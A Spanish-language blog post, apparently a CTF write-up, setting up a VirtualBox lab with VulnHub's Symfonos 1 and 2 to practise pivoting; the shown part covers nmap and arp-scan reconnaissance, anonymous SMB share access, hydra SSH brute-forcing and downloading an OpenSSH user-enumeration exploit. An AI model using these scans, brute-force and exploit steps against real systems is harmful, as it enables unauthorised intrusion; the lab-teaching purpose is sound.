<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Sergiky">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://sergiky.github.io/2024/12/04/symfonos 1 y 2/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="Introducción al Pivoting.Bueenos días&#x2F;tardes&#x2F;noches hackerss, hoy vamos a montarnos un laboratorio de máquinas vulnerables para aprender un poco de Pivoting(Moverse lateralmente para comprom">
<meta property="og:type" content="article">
<meta property="og:title" content="Symfonos 1 y 2 | S4vitar | Pivoting I">
<meta property="og:url" content="https://sergiky.github.io/2024/12/04/Symfonos%201%20y%202/index.html">
<meta property="og:site_name" content="Sergiky">
<meta property="og:description" content="Introducción al Pivoting.Bueenos días&#x2F;tardes&#x2F;noches hackerss, hoy vamos a montarnos un laboratorio de máquinas vulnerables para aprender un poco de Pivoting(Moverse lateralmente para comprom">
<meta property="og:locale" content="es_ES">
<meta property="og:image" content="https://sergiky.github.io/images/sergiky.webp">
<meta property="article:published_time" content="2024-12-03T23:00:00.000Z">
<meta property="article:modified_time" content="2025-04-01T13:50:18.471Z">
<meta property="article:author" content="Sergio Guijarro">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="eJPT">
<meta property="article:tag" content="vulnhub">
<meta property="article:tag" content="medium">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="pivoting">
<meta property="article:tag" content="eCPPTv2">
<meta property="article:tag" content="eCPTXv2">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sergiky.github.io/images/sergiky.webp">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/letter-s-favicon.svg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/letter-s-favicon.svg">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/letter-s-favicon.svg">
    <!--- Page Info-->
    
    <title>
        
            Symfonos 1 y 2 | S4vitar | Pivoting I | Sergiky
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"sergiky.github.io","root":"/","language":"es","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"20px","line_height":1.5,"image_border_radius":"20px","image_alignment":"center","image_caption":true,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":false,"count":false,"min2read":false},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":false,"pangu_js":false,"recommendation":{"enable":true,"title":"Artículos recomendados","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1400px","sidebar_width":"300px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/sergiky.webp","description":null},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/black.gif","dark":"/images/black.gif"},"title":"<div class=\"social-contacts px-6 py-3 bg-gray-300/50 dark:bg-gray-500/40 backdrop-blur-lg border border-white/20 dark:border-gray-500/30 shadow-redefine-flat rounded-3xl flex flex-row gap-3 items-center\"> <span>✧Sergiky World✧</span> </div>","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/sergiky"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"CTF":{"path":"/categories/ctf","icon":"fa-regular fa-archive","submenus":{"Labs":"/categories/ctf/labs","TryHackMe":"/categories/ctf/tryhackme","Hack The Box":"/categories/ctf/hackthebox"}},"Whoami":{"icon":"fa-regular fa-user","path":"/whoami"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":false,"position":"right","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"YYYY-MM-DD","excerpt_length":200,"categories":{"enable":false,"limit":3},"tags":{"enable":true,"limit":3}}};
    window.lang_ago = {"second":"Hace %s segundos","minute":"Hace %s minutos","hour":"Hace %s horas","day":"Hace %s días","week":"Hace %s semanas","month":"Hace %s meses","year":"Hace %s años"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Sergiky
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    CTF
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a href="/categories/ctf/labs">
                                                    LABS
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a href="/categories/ctf/tryhackme">
                                                    TRYHACKME
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a href="/categories/ctf/hackthebox">
                                                    HACK THE BOX
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/whoami"
                                        >
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    WHOAMI
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-CTF"
                        >
                            <span>
                                CTF
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-CTF">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/categories/ctf/labs">LABS</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/categories/ctf/tryhackme">TRYHACKME</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/categories/ctf/hackthebox">HACK THE BOX</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/whoami"
                        >
                            <span>
                                WHOAMI
                            </span>
                            
                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">54</div>
        <div class="label text-third-text-color text-sm">Etiquetas</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
        <div class="label text-third-text-color text-sm">Categorías</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
        <div class="label text-third-text-color text-sm">Publicaciones</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			
			
			<img src="https://sergiky.github.io/2024/12/04/Symfonos%201%20y%202/cover-image.png" alt="Symfonos 1 y 2 | S4vitar | Pivoting I" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
			
			<div class="w-full flex items-center absolute bottom-0 justify-start">
				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">Symfonos 1 y 2 | S4vitar | Pivoting I</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/letter-s-favicon.svg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">Sergiky</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-12-04</span>
        <span class="mobile">2024-12-04</span>
        <span class="hover-info">Creado</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-04-01 15:50:18</span>
            <span class="mobile">2025-04-01 15:50:18</span>
            <span class="hover-info">Actualizado</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/ctf/">ctf</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/ctf/labs/">labs</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/ctf/">ctf</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/eJPT/">eJPT</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/vulnhub/">vulnhub</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/medium/">medium</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/linux/">linux</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/pivoting/">pivoting</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/eCPPTv2/">eCPPTv2</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/eCPTXv2/">eCPTXv2</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="Introduccion-al-Pivoting"><a href="#Introduccion-al-Pivoting" class="headerlink" title="Introducción al Pivoting."></a>Introducción al Pivoting.</h1><p>Bueenos días&#x2F;tardes&#x2F;noches hackerss, hoy vamos a montarnos un laboratorio de máquinas vulnerables para aprender un poco de <strong>Pivoting(Moverse lateralmente para comprometer otro dispositivo)</strong>.</p>
<img src="/2024/12/04/Symfonos%201%20y%202/diagrama-introducci%C3%B3n.png" class="" title="Diagrama introductorio.">

<p>¿Y cómo saltas de Symfonos 1 a Symfonos 2?.<br>Symfonos 1 es capaz de ver a Symfonos 2 gracias a otra <strong>tarjeta de red</strong> que permite ver otras máquinas, en este caso Symfonos 2.</p>
<p>Una vez entendido el concepto vamos a realizar la configuración del laboratorio.</p>
<h1 id="Configuracion-del-laboratorio"><a href="#Configuracion-del-laboratorio" class="headerlink" title="Configuración del laboratorio"></a>Configuración del laboratorio</h1><p>Partimos de las máquinas ya preparadas en <strong>VirtualBox</strong> con modo puente. Al realizar un escaneo de red se pueden ver las dos máquinas y esa no es la idea, para solucionar esto vamos a configurar una <strong>red NAT</strong>, para ello vamos al siguiente apartado de configuración: Máquina &gt; Herramientas &gt; Administrador de red y la pestaña de redes NAT, ahí le damos a crear y en mi caso voy a utilizar el rango <strong>192.168.100.0&#x2F;24</strong>.</p>
<p>El siguiente paso es añadir un Adaptador de red extra a Symfonos uno, indicándole que sea de tipo red NAT y exactamente la creada por nosotros. Actualmente deberemos tener dos tarjetas de red, la primera modo puente y la segunda red NAT.</p>
<p>En la configuración de red de Symfonos2 debemos sustituir el modo puente por el modo NAT indicado y así las dos máquinas podrían verse entre ellas.</p>
<p>Ahora si levantamos las dos máquinas y realizamos un escaneo podemos apreciar que solo vemos una máquina(Symfonos1)</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> arp-scan -I wlan0 -l</span><br></pre></td></tr></table></figure></div>

<p>Recomiendo realizar una <strong>instantánea</strong> de cada máquina por si tenemos cualquier problema no tener que volver a realizar el mismo proceso.</p>
<h1 id="Reconocimiento"><a href="#Reconocimiento" class="headerlink" title="Reconocimiento"></a>Reconocimiento</h1><h2 id="Preparacion-de-directorios"><a href="#Preparacion-de-directorios" class="headerlink" title="Preparación de directorios."></a>Preparación de directorios.</h2><p>Como buen hacker perezoso que soy dispongo de una pequeña función(en este caso en mi zshrc, podías utilizarlo en la bashrc) que me crea los directorios de trabajo para no ir uno a uno(Idea obtenida de s4vitar)</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">mkt</span></span> () &#123;</span><br><span class="line">	<span class="built_in">mkdir</span> &#123;recog,play,data&#125;</span><br><span class="line">	<span class="built_in">touch</span> <span class="string">&quot;<span class="subst">$(pwd | awk -F <span class="string">&quot;/&quot;</span> &#x27;&#123;print $NF&#125;&#x27;)</span>-write-up.md&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>Podéis poner lo que queráis, en este caso tengo tres directorios y un fichero write-up.md con el nombre de la carpeta padre(Symfonos-write-up.md)</p>
<h2 id="Escaneo-red-interna"><a href="#Escaneo-red-interna" class="headerlink" title="Escaneo red interna"></a>Escaneo red interna</h2><p>El escaneo de red ya lo hemos realizado antes con <strong>arp-scan</strong>, también podemos utilizar otras herramientas cómo <strong>netdiscover</strong>. Recordar que esto es un CTF, estamos usando modos activos que generar mucha traza y en un entorno real pueden levantar sospechas y ser detectado, en un entorno real un método sería mantenerse a la escucha analizando la red y ir obteniendo información de los equipos.</p>
<h2 id="¿Equipo-operativo"><a href="#¿Equipo-operativo" class="headerlink" title="¿Equipo operativo?"></a>¿Equipo operativo?</h2><p>Le lanzamos una traza ICMP(un ping de toda la vida) para comprobar la operatividad del equipo víctima.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 192.168.1.178</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/ping.png" class="" title="Uso de ping para comprobar si tenemos comunicación con la víctima">

<p>En la imagen se puede apreciar que el <strong>ttl&#x3D;64</strong>, si miramos está <a class="link"   target="_blank" rel="noopener" href="https://subinsb.com/default-device-ttl-values/" >página<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> podemos ver que cada sistemas operativo tiene un tiempo de respueta <strong>por defecto</strong>, esto no significa que haya podido ser modificado. </p>
<h2 id="Escaneo-de-puertos"><a href="#Escaneo-de-puertos" class="headerlink" title="Escaneo de puertos"></a>Escaneo de puertos</h2><p>Disponemos de veintemil herramientas de escaneo de puertos, aquí solo voy a realizar la enumeración de forma activa</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --open -sS --min-rate=4500 -vvv -n -Pn 192.168.1.178 -oG ToLosPuertos</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong>-p-</strong> -&gt; Escaneamos todo el rango de purtos(0-65535).</p>
</li>
<li><p><strong>–open</strong> -&gt; Indicamos que solo queremos mostrar los que están abiertos.</p>
</li>
<li><p><strong>-sS</strong> -&gt; Uso de Syn Scan o también conocido cómo half-open scan. En lugar de completar el <strong>three-way-hanshake</strong>(SYN -&gt; SYN&#x2F;ACK -&gt; ACK) el escaneo <strong>envía un paquete RST</strong> tras recibir el SYN&#x2F;ACK identificado puertos rápidamente y reduciendo la posibilidad de ser detectados por un firewall(aunque esto nos da igual ahora).  </p>
</li>
<li><p><strong>–min-rate&#x3D;4500</strong> -&gt; Establece la <strong>tasa mínima de paquetes enviados</strong>. No recomiendo subir más porque puede provocar que se salte puertos.</p>
</li>
<li><p><strong>-vvv</strong> -&gt; Triple verbose. Queremos que nos de un chorro de información por la consola.</p>
</li>
<li><p><strong>-n</strong> -&gt; Evitamos la resolución DNS(No intentará convertira la ip en nombre de dominio).</p>
</li>
<li><p><strong>-Pn</strong> -&gt; Desactivar la opción <strong>host discovery</strong>. Esto significa en cristiano que comprueba si el host está encencido antes de escanearlo(lo hemos antes con el ping).</p>
</li>
<li><p><strong>-oG</strong> -&gt; Exportamos la información obtenida en un archivo con formato grepeable(que a continuación veréis porque).</p>
</li>
</ul>
<p>Dispones de otras alternativas como <a class="link"   target="_blank" rel="noopener" href="https://github.com/projectdiscovery/naabu" >naabu<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> de projectdiscovery que también es muy potente.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">naabu -Pn -host 192.168.1.178</span><br></pre></td></tr></table></figure></div>

<p>Vamos a utilizar extractPorts, otra función definida en la zshrc robada a s4vitar para mostrar los puertos encontrados y copiarlos a la clipboard(recuerdo que estoy utilizando Arch Linux con Hyprland por eso utilizo wl-copy, si utilizas kali linux&#x2F;parrot deberías cambiarlo a xclip -sel clipboard)</p>
<img src="/2024/12/04/Symfonos%201%20y%202/extractPorts.png" class="" title="Uso de la utilidad extractPorts">

<h3 id="Servicios-y-versiones-de-los-puertos"><a href="#Servicios-y-versiones-de-los-puertos" class="headerlink" title="Servicios y versiones de los puertos"></a>Servicios y versiones de los puertos</h3><p>Una vez copiados en la clipboard vamos a buscar la versión y el servicio extra que corren sobre dichos puertos.</p>
<p>Para ello vamos a lanzar unos script básicos de reconocimiento.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sCV -p22,25,80,139,445 192.168.1.178 -oN targeted</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/escaneo_servicios.png" class="" title="Escaneo de versión y servicios de los puertos detectados.">

<p>TIP!</p>
<p>Podemos sacar el codename(nombre informal de la versión) de la máquina víctima, para ello vemos que en la línea del puerto ssh, en la versión nos aparece esto:</p>
<ul>
<li>OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</li>
</ul>
<p>Y si buscamos esto en Google? -&gt; OpenSSH 7.4p1 Debian 10+deb9u6.</p>
<p>Query de Google -&gt; launchpad OpenSSH 7.4p1 Debian 10+deb9u6</p>
<p>En mi caso, en el primer resultado de búsqueda, al darle podemos apreciar que es un <strong>Debian Stretch</strong>.</p>
<p>Más abajo tenemos el puerto 80 de http, podemos realizar lo mismo y en caso de que no sea el mismo codename o otro SO <strong>podríamos pensar que hay contenedores con Docker</strong> pero no es el caso.</p>
<p>Antes de abrir el navegador para ver que ahí(se que estáis deseosos pillines) podéis usar si os interesa la herramienta <strong>whatweb</strong> que es como la extensión Wappalyzer, pero desde consola:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.1.178</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/whatweb.png" class="" title="Uso de la herramienta whatweb">

<h2 id="Primera-exploracion-desde-el-navegador"><a href="#Primera-exploracion-desde-el-navegador" class="headerlink" title="Primera exploración desde el navegador"></a>Primera exploración desde el navegador</h2><p>Abrimos el navegador y vemos las tecnologías utilizadas con Wappalizer, podemos ver que la versión de apache no es la última(está es la 2.4.62) y podemos buscar diferentes cve en <a class="link"   target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=apache+2.4.25" >cve mitre<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Podemos apreciar diferentes vulnerabilidades aunque no nos servirían para la explotación de la máquina, además, los tiros no van por aquí.</p>
<p>Revisamos el código fuente de la página(ctrl + u), vacío, no voy a poner ni una captura.</p>
<p>La consola y sus diferentes herramientas, tampoco vemos nada por ningún sitio.</p>
<h2 id="Listar-recursos-compartidos-de-Samba"><a href="#Listar-recursos-compartidos-de-Samba" class="headerlink" title="Listar recursos compartidos de Samba"></a>Listar recursos compartidos de Samba</h2><p>Si vemos el archivo del escaneo de puertos anterior, podemos ver el puerto 139 y el 445 incluso que la autenticación esta activada, pero no se pide.</p>
<p>Podemos probar a listar los recursos compartidos con smbmap:</p>
<h3 id="Uso-de-smbmap-fallido"><a href="#Uso-de-smbmap-fallido" class="headerlink" title="Uso de smbmap(fallido)"></a>Uso de smbmap(fallido)</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 192.168.1.178</span><br></pre></td></tr></table></figure></div>

<p>En este caso, dado un problema no encontrado a día de hoy con la herramienta no podemos utilizarla, pero no pasa ni media chicosss tenemos un montón de alternativas.</p>
<h3 id="Null-session-con-smbclient"><a href="#Null-session-con-smbclient" class="headerlink" title="Null session con smbclient"></a>Null session con smbclient</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.1.178 -N  </span><br></pre></td></tr></table></figure></div>

<p>De esta forma no podremos ver los permisos directamente como con smbmap</p>
<img src="/2024/12/04/Symfonos%201%20y%202/smbclient_1.png" class="" title="Uso de smbclient para ver los recursos">

<p>Podemos acceder y ver el contenido del directorio anonymous:</p>
<p>Nos debemos de meter dentro del recurso compartido:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.1.178/anonymous -N</span><br></pre></td></tr></table></figure></div>

<p>Y ahora podemos hacer un ls y ver los archivos, consecutivamente utilizamos el comando get para traernos el archivo a nuestro sistema local.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get attention.txt</span><br></pre></td></tr></table></figure></div>
<img src="/2024/12/04/Symfonos%201%20y%202/archivo_attention_smb.png" class="" title="Descargar el archivo attention.txt desde smb">

<img src="/2024/12/04/Symfonos%201%20y%202/contenido_attention_smb.png" class="" title="Contenido del archivo attention.txt">

<p>Pues viendo este mensaje realista podemos apreciar tres posibles contraseñas y un usuario. También estas contraseñas me suenan a rockyou… aunque no se si tendrá algún sentido en el futuro. De momento nos apuntamos las contraseñas en un archivo passwords.txt y el usuario en usernames.txt.</p>
<p>Recordamos que esta máquina tiene el servicio ssh abierto, podmeos realizar un ataque por fuerza bruta para ver si algunas de estas contraseñas es válido para dicho usuario(y si cuela, recuerda que estamos en un CTF)</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l zeus -p passwords.txt</span><br><span class="line">hydra -l Zeus -p passwords.txt</span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/primer_intento_zeus_ssh_fuerza_bruta.png" class="" title="Fuerza bruta con hydra a el usuario Zeus.">

<h2 id="Enumeracion-de-usuario-mediante-SSH"><a href="#Enumeracion-de-usuario-mediante-SSH" class="headerlink" title="Enumeración de usuario mediante SSH"></a>Enumeración de usuario mediante SSH</h2><p>En el archivo tarteged podemos apreciar que la versión de ssh es menor a la <strong>7.7</strong>, esto significa que nos permite enumerar usuarios de forma válida, para ellos utilizamos searchsploit:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ssh user enumeration </span><br></pre></td></tr></table></figure></div>

<img src="/2024/12/04/Symfonos%201%20y%202/searchsploit_ssh_user_enum.png" class="" title="Exploit en python para la enumeración de usuarios.">

<p>Aunque sea una versión inferior, esta vulnerabilidad puede estar <strong>parcheada igualmente</strong>, pero vamos a comprobarlo. </p>
<p>Nos lo descargamos con:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m linux/remote/45939.py</span><br></pre></td></tr></table></figure></div>

<p>En mi caso lo voy a renombrar con un nombre más identificable a primera vista(ssh_enum_user.py)</p>
<p>Voy a tener que utilizar un entorno virtual porque en arch no deja utilizar pip con el fin de no ocasionar conflictos con los paquetes del sistema. </p>
